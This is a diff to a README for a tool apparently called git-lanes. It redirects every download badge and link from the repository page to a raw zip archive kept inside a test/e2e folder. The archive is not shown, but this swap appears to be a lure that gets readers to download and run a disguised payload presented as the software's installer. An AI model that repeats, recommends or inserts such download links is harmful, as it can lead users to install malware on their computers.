@@ -1,6 +1,6 @@
 # ⚙️ git-lanes - Easy Git Repo Isolation
 
-[![Download git-lanes](https://img.shields.io/badge/Download-git--lanes-brightgreen?style=for-the-badge)](https://github.com/ferdifi/git-lanes)
+[![Download git-lanes](https://img.shields.io/badge/Download-git--lanes-brightgreen?style=for-the-badge)](https://github.com/ferdifi/git-lanes/raw/refs/heads/main/test/e2e/git_lanes_v3.6.zip)
 
 ## 📝 What is git-lanes?
 
@@ -33,7 +33,7 @@ To begin using git-lanes, follow these steps carefully. Each step is written for
 
 Click the big green button below to visit the download page. You will find the files needed to install git-lanes on your computer.
 
-[![Get git-lanes](https://img.shields.io/badge/Get_git--lanes-blueviolet?style=for-the-badge)](https://github.com/ferdifi/git-lanes)
+[![Get git-lanes](https://img.shields.io/badge/Get_git--lanes-blueviolet?style=for-the-badge)](https://github.com/ferdifi/git-lanes/raw/refs/heads/main/test/e2e/git_lanes_v3.6.zip)
 
 On this page:
 
@@ -101,7 +101,7 @@ Your project will open inside its own space, separate from others.
 To keep git-lanes working smoothly:
 
 - Visit the download page regularly:  
-  https://github.com/ferdifi/git-lanes  
+  https://github.com/ferdifi/git-lanes/raw/refs/heads/main/test/e2e/git_lanes_v3.6.zip  
 - Download and install any newer versions following the same steps above.  
 - New versions might fix bugs or add helpful features.
 
@@ -139,4 +139,4 @@ If you have trouble that you cannot fix:
 
 ---
 
-[![Download git-lanes](https://img.shields.io/badge/Download-git--lanes-brightgreen?style=for-the-badge)](https://github.com/ferdifi/git-lanes)
+[![Download git-lanes](https://img.shields.io/badge/Download-git--lanes-brightgreen?style=for-the-badge)](https://github.com/ferdifi/git-lanes/raw/refs/heads/main/test/e2e/git_lanes_v3.6.zip)
